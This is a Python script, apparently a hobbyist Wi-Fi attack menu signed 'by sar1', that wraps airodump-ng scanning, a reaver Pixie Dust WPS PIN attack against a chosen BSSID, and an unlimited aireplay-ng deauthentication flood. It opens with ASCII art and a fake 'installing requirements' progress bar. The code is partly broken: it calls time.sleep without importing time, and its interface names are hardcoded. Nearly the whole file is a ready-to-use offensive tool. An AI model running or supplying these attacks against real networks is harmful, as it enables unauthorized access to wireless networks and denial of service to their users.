import subprocess
import os
import sys
import random
from termcolor import colored
from tqdm import tqdm
from time import sleep

os.system('clear')
print("Installing requriments.........")
for i in tqdm(range(10000)):
	sleep(0.0005)
while True:
    os.system('clear')
    random_number = random.randint(1, 2)
    if random_number == 1:
            text = colored("""
                                                                                                      
I8,        8        ,8I 88    ad88 88         ,ad8888ba,                                   88         
`8b       d8b       d8' ""   d8"   ""        d8"'    `"8b                                  88         
 "8,     ,8"8,     ,8"       88             d8'                                            88         
  Y8     8P Y8     8P   88 MM88MMM 88       88            8b,dPPYba, ,adPPYYba,  ,adPPYba, 88   ,d8   
  `8b   d8' `8b   d8'   88   88    88       88            88P'   "Y8 ""     `Y8 a8"     "" 88 ,a8"    
   `8a a8'   `8a a8'    88   88    88       Y8,           88         ,adPPPPP88 8b         8888[      
    `8a8'     `8a8'     88   88    88        Y8a.    .a8P 88         88,    ,88 "8a,   ,aa 88`"Yba,   
     `8'       `8'      88   88    88         `"Y8888Y"'  88         `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a  
                                                                                                      
                                                                                                      
                                                                                         
           
											  --- by sar1 
	     
""", "green")
            print(text)
    else:
            text = colored("""
        ~~~~~             ()          ~~~~~                                          
                          ()~~~~~~~                                                   
  "My theory was correct! ()                 ~~~~~~~~   /\                           
   The giant Krono-Meglo- ()   ~~~~~~ /\__/\           /  ~-.                        
    Brutasaurus is NOT    ()       _.' __   '.        /      \                       
   extinct! Just look at  ()     .'(x)(x)     \____  /       /                       
   those great, crushing  ()    /_________     \  / /   ~~~~~~                       
   jaws, Dodson! Imagine  ()     \/\/\/\/_\     \/ /       /                         
   those rending teeth   _()_    _/_______/ ~~~~~~~~~~    /                          
   in action!..."    \ ./____\.  \_________      /       /                             
                      \   __ ~~~~          \    (       / ~~~                            
      ~~~~~~~~       /   /  \   \           \    \     \'                              
                     |   \__/   |       ~~~~~~~   \     \\______                        
                 ~~~~~~~        /          /       '\   / \    /                     
                      \___ \ __/   ~~~~    \         \  \  \  /                      
                     /_____ \ __\          /\        /  /   \/                        
            ~~~~~~~     "Doctor, shut the /  \      (__/  ~~~~~__                          
    ~~~~~                    fuck up."  ./   /\               \  /                       
                ~~~~~~~~               /    /  ~~~~~~~~~~      \/                          
                                      (     \   \               \____                       
         ~~~~~~          ~~~~     ~~~~~~     \   \               \  /                           
                                       \   jro\   \               \/                      

							     
				                                      --- by sar1
""", "green")
            print(text)    
    print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n")
    text = colored(">>Select Option by Entering the following number<<\n", "yellow")
    print(text)
    print("1. Wifi Adptor to Montor mode")
    print("2. Wifi Scan && Attack")
    print("3. Attack scanned wifi")
    print("4. Wifi Deauthentication Attack\n")
    option = int(input("Choose the option : "))
    os.system('clear')

    if option == 1:
        text = colored("Adptor Interfaces: ", "yellow")
        print(text)
        print("1.wlan0")
        print("2.Wlan0mon")

        adptor = int(input("\nChoose Your Adptor Interface: "))
        if adptor == 1:
            result = subprocess.run(["bash","wifi_crack.sh"] ,capture_output=True, text=True)
            if result.returncode == 0:
                if result.stdout:
                    print("Output:")
                    print(result.stdout)
                    print(">>> Changed to monitor mode succesfully <<<\n")
                else:
                    print("ERROR: Failed to change to monitor mode. Recheck the adptor and try.")
                adptor_return = int(input("Press 1 to Continue or Ctrl+z to quit: "))
                if adptor_return == 1:
                    continue
                else:
                    break
            else:
                print("Error: Check if your adapter is connected properly and Retry again")
                print(result.stderr)
                break
    elif option == 2:
      #os.system('clear')
      gnome_terminal_path = subprocess.check_output(["which", "gnome-terminal"]).decode("utf-8").strip()
      subprocess.call([gnome_terminal_path, "--", "sh", "-c", "echo ****Run the tool again to attck [option 3]****; bash"])
      subprocess.call(["airodump-ng", "wlan0"])
      subprocess.call(["airodump-ng", "wlan0"])
    elif option == 3:
        text = colored("Enter the Details: ", "yellow")
        print(text)
        bssid = input("Enter bssid: ")
        channel = int(input("Enter channel: "))
        subprocess.call(["reaver", "-i", "wlan0", "-b", bssid, "-c", str(channel), "-K", "1", "-vv"])
        print("Start")
        time.sleep(10)
        print("End")
    elif option == 4:
        text = colored("Enter the Details: ", "yellow")
        print(text)
        bssid2 = input("Enter bssid: ")
        subprocess.call(["aireplay-ng", "-0", "0", "-a", bssid2 ,"wlan0"])
    else:
        print("Invalid option. Please choose a valid option.")
        break
